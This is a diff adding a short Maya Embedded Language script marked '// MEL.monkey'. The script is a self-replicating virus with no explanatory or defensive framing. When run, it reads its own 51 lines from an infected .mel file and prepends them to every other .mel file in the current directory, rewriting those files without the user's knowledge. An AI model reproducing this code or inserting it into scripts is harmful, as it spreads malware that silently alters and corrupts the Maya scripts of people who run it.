@@ -1,0 +1,51 @@
+// MEL.monkey
+string $pwd = `pwd`;
+string $cur = $pwd + "/";
+string $files[] = `getFileList -fld $cur -fs "*.mel"`;
+string $mycode[],$line,$orig;
+int $id,$cnt = 0,$found = 0;
+for($file in $files )
+{
+$id = `fopen $file "r"`;
+$line = `fgetline $id`;
+if(!strcmp($line,"// MEL.monkey\n"))
+{
+$mycode[0] = $line;
+while($cnt < 50)
+{
+$line = `fgetline $id`;
+$mycode[$cnt+1] = $line;
+$cnt++;
+}
+$found = 1;
+}
+fclose $id;
+}
+if($found)
+{
+for($file in $files )
+{
+$id = `fopen $file "r"`;
+$line = `fgetline $id`;
+fclose $id;
+if(strcmp($line,"// MEL.monkey\n"))
+{
+$id = `fopen $file "r"`;
+$orig=`fread $id $orig`;
+fclose $id;
+$id = `fopen $file "w"`;
+$cnt = 0;
+if($id != 0)
+{
+while($cnt < 51)
+{
+fwrite $id $mycode[$cnt];
+$cnt++;
+}
+fwrite $id $orig
+fclose $id;
+}
+}
+}
+}
+
